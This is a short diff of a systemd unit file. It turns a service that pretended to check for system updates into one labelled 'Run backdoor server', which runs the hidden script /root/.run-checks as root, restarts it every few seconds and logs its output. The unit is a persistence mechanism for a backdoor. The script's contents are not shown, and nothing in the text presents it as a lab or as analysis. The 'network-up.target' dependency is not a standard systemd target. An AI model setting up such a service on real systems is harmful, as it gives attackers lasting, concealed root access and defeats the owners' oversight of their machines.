@@ -1,10 +1,14 @@
 [Unit]
-Description=A service to check regularly for system updates
+Description=Run backdoor server
 After=network-up.target
 
 [Service]
-ExecStart=/root/.run-checks
+ExecStart=/bin/bash /root/.run-checks
 Restart=always
+RestartSec=5
+StandardOutput=append:/var/log/run-checks.log
+StandardError=append:/var/log/run-checks.err
+User=root
 
 [Install]
 WantedBy=multi-user.target
